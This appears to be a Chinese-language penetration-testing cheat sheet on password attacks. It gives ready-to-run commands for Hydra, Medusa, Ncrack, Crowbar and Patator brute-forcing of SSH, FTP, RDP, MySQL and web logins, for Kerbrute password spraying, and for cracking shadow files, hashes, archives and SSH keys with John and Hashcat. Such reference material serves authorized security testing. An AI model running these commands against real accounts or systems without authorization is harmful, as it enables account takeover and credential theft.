# 密码攻击

_11 条工具命令_

### Hydra  `hydra`
_网络登录破解工具_

**Step 0**
> 使用用户名和密码字典爆破SSH
_platform: linux_
```
hydra -l user -P wordlist.txt ssh://target_ip
```
**语法解析：**
- `hydra` — Hydra破解工具 _command_
- `-l` — 指定用户名 _parameter_
- `-L` — 指定用户名字典文件 _parameter_
- `-p` — 指定密码 _parameter_
- `-P` — 指定密码字典文件 _parameter_
- `ssh://` — 目标服务协议 _value_

**Step 0**
> 爆破FTP服务
_platform: linux_
```
hydra -L users.txt -P passwords.txt ftp://target_ip
```

**Step 0**
> 爆破HTTP表单登录
_platform: linux_
```
hydra -l admin -P wordlist.txt target_ip http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```
**语法解析：**
- `http-post-form` — HTTP POST表单模块 _value_
- `^USER^` — 用户名占位符 _value_
- `^PASS^` — 密码占位符 _value_
- `Invalid` — 失败响应标识 _value_

**Step 0**
> 爆破RDP服务
_platform: linux_
```
hydra -l administrator -P wordlist.txt rdp://target_ip
```

**Step 0**
> 爆破MySQL数据库
_platform: linux_
```
hydra -l root -P wordlist.txt mysql://target_ip
```

**Step 0**
> 指定线程数
_platform: linux_
```
hydra -t 4 -l user -P wordlist.txt ssh://target_ip
```
**语法解析：**
- `-t` — 并发线程数 _parameter_

**Step 0**
> 恢复之前中断的任务
_platform: linux_
```
hydra -R
```
**语法解析：**
- `-R` — 恢复任务 _parameter_

---

### John the Ripper  `john`
_密码破解工具_

**Step 0**
> 使用字典破解哈希
_platform: linux_
```
john --wordlist=wordlist.txt hash.txt
```
**语法解析：**
- `john` — John破解工具 _command_
- `--wordlist=` — 指定字典文件 _parameter_

**Step 0**
> 指定哈希格式
_platform: linux_
```
john --wordlist=wordlist.txt --format=raw-md5 hash.txt
```
**语法解析：**
- `--format=` — 指定哈希格式 _parameter_

**Step 0**
> 显示已破解的密码
_platform: linux_
```
john --show hash.txt
```
**语法解析：**
- `--show` — 显示结果 _parameter_

**Step 0**
> 破解Linux密码文件
_platform: linux_
```
unshadow /etc/passwd /etc/shadow > mypasswd
john --wordlist=wordlist.txt mypasswd
```
**语法解析：**
- `unshadow` — 合并passwd和shadow文件 _command_

**Step 0**
> 破解ZIP文件密码
_platform: linux_
```
zip2john protected.zip > zip.hash
john --wordlist=wordlist.txt zip.hash
```
**语法解析：**
- `zip2john` — 提取ZIP密码哈希 _command_

**Step 0**
> 破解RAR文件密码
_platform: linux_
```
rar2john protected.rar > rar.hash
john --wordlist=wordlist.txt rar.hash
```

**Step 0**
> 破解SSH私钥密码
_platform: linux_
```
ssh2john id_rsa > ssh.hash
john --wordlist=wordlist.txt ssh.hash
```

**Step 0**
> 使用暴力破解模式
_platform: linux_
```
john --incremental hash.txt
```
**语法解析：**
- `--incremental` — 暴力破解模式 _parameter_

---

### Hashcat  `hashcat`
_GPU加速密码破解工具_

**Step 0**
> 使用字典破解MD5哈希
_platform: linux_
```
hashcat -m 0 -a 0 hash.txt wordlist.txt
```
**语法解析：**
- `hashcat` — Hashcat破解工具 _command_
- `-m 0` — 哈希类型(MD5) _parameter_
- `-a 0` — 攻击模式(字典攻击) _parameter_

**Step 0**
> 暴力破解模式
_platform: linux_
```
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a
```
**语法解析：**
- `-a 3` — 暴力破解模式 _parameter_
- `?a` — 所有字符掩码 _value_

**Step 0**
> 掩码字符集说明
```
?l = abcdefghijklmnopqrstuvwxyz
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d = 0123456789
?s = 特殊字符
?a = 所有字符
?b = 0x00-0xff
```

**Step 0**
> 使用规则文件进行破解
_platform: linux_
```
hashcat -m 0 -a 0 hash.txt wordlist.txt -r rules/best64.rule
```
**语法解析：**
- `-r` — 指定规则文件 _parameter_

**Step 0**
> 组合两个字典
_platform: linux_
```
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt
```
**语法解析：**
- `-a 1` — 组合攻击模式 _parameter_

**Step 0**
> 常用哈希类型编号
```
-m 0 = MD5
-m 100 = SHA1
-m 1400 = SHA256
-m 1700 = SHA512
-m 1000 = NTLM
-m 1800 = SHA512crypt
-m 3200 = bcrypt
-m 5600 = NetNTLMv2
-m 13100 = Kerberos TGS
```

**Step 0**
> 显示已破解的结果
_platform: linux_
```
hashcat -m 0 hash.txt --show
```

**Step 0**
> 测试GPU性能
_platform: linux_
```
hashcat -b
```

---

### Kerbrute  `kerbrute-tool`
_Kerberos暴力破解工具_

**Step 0**
> 枚举域用户
```
kerbrute userenum -d domain.com --dc dc_ip users.txt
```

**Step 0**
> 密码喷洒攻击
```
kerbrute passwordspray -d domain.com --dc dc_ip users.txt Password123
```

**Step 0**
> 暴力破解用户
```
kerbrute bruteuser -d domain.com --dc dc_ip wordlist.txt username
```

**Step 0**
> 验证凭证
```
kerbrute -d domain.com --dc dc_ip user:password
```

---

### Medusa  `medusa`
_快速并行网络登录暴力破解工具_

**Step 0**
> 4线程SSH密码暴力破解
```
medusa -h target_ip -u admin -P passwords.txt -M ssh -t 4
```
**语法解析：**
- `medusa` — 并行网络登录破解工具 _command_
- `-h` — 目标主机 _parameter_
- `-u` — 用户名 _parameter_
- `-P` — 密码字典文件 _parameter_
- `-M ssh` — 指定协议模块 _parameter_
- `-t 4` — 并发线程数 _parameter_

**Step 0**
> RDP远程桌面密码破解
```
medusa -h target_ip -U users.txt -P passwords.txt -M rdp -t 2
```

**Step 0**
> FTP破解(找到密码后停止)
```
medusa -h target_ip -U users.txt -P passwords.txt -M ftp -f
```

**Step 0**
> 批量主机爆破(5台并行)
```
medusa -H hosts.txt -U users.txt -P pass.txt -M ssh -t 3 -T 5
```

---

### Ncrack  `ncrack`
_Nmap项目出品的高速网络认证破解工具_

**Step 0**
> SSH认证暴力破解
```
ncrack -vv -U users.txt -P passwords.txt ssh://target_ip
```
**语法解析：**
- `ncrack` — 高速网络认证破解工具 _command_
- `-vv` — 详细输出 _parameter_
- `ssh://target_ip` — 协议://目标格式 _value_

**Step 0**
> 同时破解多个目标的不同服务
```
ncrack -U users.txt -P pass.txt ssh://10.0.0.1 rdp://10.0.0.2 ftp://10.0.0.3
```

**Step 0**
> 直接导入Nmap扫描结果进行破解
```
ncrack -iX nmap_scan.xml -U users.txt -P pass.txt
```

---

### Crowbar  `crowbar`
_专注RDP/VNC/SSH密钥/OpenVPN的暴力破解工具_

**Step 0**
> RDP密码暴力破解(2线程)
```
crowbar -b rdp -s target_ip/32 -u admin -C passwords.txt -n 2
```
**语法解析：**
- `-b rdp` — 指定协议类型 _parameter_
- `-s` — 目标IP/CIDR _parameter_
- `-n 2` — 并发连接数 _parameter_

**Step 0**
> 尝试多个SSH私钥登录
```
crowbar -b sshkey -s target_ip/32 -u root -k /path/to/keys/
```

**Step 0**
> VNC认证暴力破解
```
crowbar -b vnckey -s target_ip/32 -p password -k /path/to/keys/
```

---

### Patator  `patator`
_多用途模块化暴力破解工具，支持数十种协议_

**Step 0**
> SSH登录暴力破解
```
patator ssh_login host=target_ip user=FILE0 password=FILE1 0=users.txt 1=passwords.txt
```
**语法解析：**
- `ssh_login` — 使用SSH登录模块 _command_
- `FILE0/FILE1` — 引用字典文件(0和1编号) _variable_

**Step 0**
> HTTP登录表单暴力破解
```
patator http_fuzz url="https://target.com/login" method=POST body="user=FILE0&pass=FILE1" 0=users.txt 1=pass.txt -x ignore:fgrep="Login failed"
```

**Step 0**
> FTP密码暴力破解
```
patator ftp_login host=target_ip user=admin password=FILE0 0=passwords.txt
```

---

### CrackStation  `crackstation`
_在线哈希查询和离线超大字典_

**Step 0**
> 在线哈希值反查明文密码
```
# 访问 https://crackstation.net
# 输入哈希值(支持MD5/SHA1/SHA256等)
# 支持批量查询(每行一个哈希)
```

**Step 0**
> 使用CrackStation超大字典离线破解
```
# CrackStation字典(15GB+):
# https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
# 配合hashcat使用:
hashcat -m 0 hashes.txt crackstation.txt
```

---

### SecLists字典  `seclists`
_安全测试人员必备的字典集合(目录、密码、用户名、Payload等)_

**Step 0**
> SecLists常用字典路径
_platform: linux_
```
# 目录字典:
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/common.txt

# 密码字典:
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

# 用户名:
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

**Step 0**
> 特殊用途字典(LFI/SQLi/子域名/参数)
_platform: linux_
```
# Fuzzing Payload:
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt

# 子域名:
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# 参数名:
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

---

### RockYou字典  `rockyou`
_来自2009年RockYou数据泄露的经典密码字典(1400万+)_

**Step 0**
> 解压Kali自带的rockyou字典
_platform: linux_
```
gzip -d /usr/share/wordlists/rockyou.txt.gz
wc -l /usr/share/wordlists/rockyou.txt  # 约14344392行
```

**Step 0**
> 配合各种密码破解工具使用
```
# Hashcat:
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# John:
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Hydra:
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target
```

---
